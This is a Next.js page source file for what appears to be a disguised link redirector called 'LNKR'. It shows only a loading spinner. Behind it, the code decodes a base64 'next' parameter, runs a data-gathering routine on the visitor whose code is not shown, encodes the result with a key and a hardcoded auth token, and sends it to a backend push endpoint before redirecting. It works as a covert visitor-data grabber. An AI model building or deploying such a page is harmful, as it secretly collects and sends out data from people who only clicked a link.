/* eslint-disable react-hooks/exhaustive-deps */
import Head from 'next/head';
import { useRouter } from 'next/router';
import QueryString from 'qs';
import { useEffect, useState } from 'react';
import get from '../utils/get';
import { validURL } from '../utils/get.helper';

const Home = () => {
  const Router = useRouter();
  const [block, setBlock] = useState(false);

  useEffect(() => {
    if (!Router.query.next || block) return;
    setBlock(true);

    const [url, key] = Buffer.from(Router.query.next as any, 'base64')
      .toString('utf-8')
      .split('; ');
    if (!validURL(url) || !key) return;

    get.run().then((data) => {
      const toSend = JSON.stringify({
        data: JSON.stringify(data),
        key: key,
        auth: "morbin'",
      });

      fetch(
        `/api/push?${QueryString.stringify({
          send: Buffer.from(toSend, 'utf-8').toString('base64'),
        })}`
      )
        .then((data) => data.text())
        .then((status) => {
          if (status === 'OK') {
            window.location.replace(url);
          }
        });
    });
  }, [Router.query.next]);

  return (
    <>
      <Head>
        <title>ЛНКР (режим отладки)</title>
      </Head>
      <div className='main'>
        <div className={`animate-spin text-button clear-both spinnerCSS`}></div>
      </div>
    </>
  );
};

export default Home;
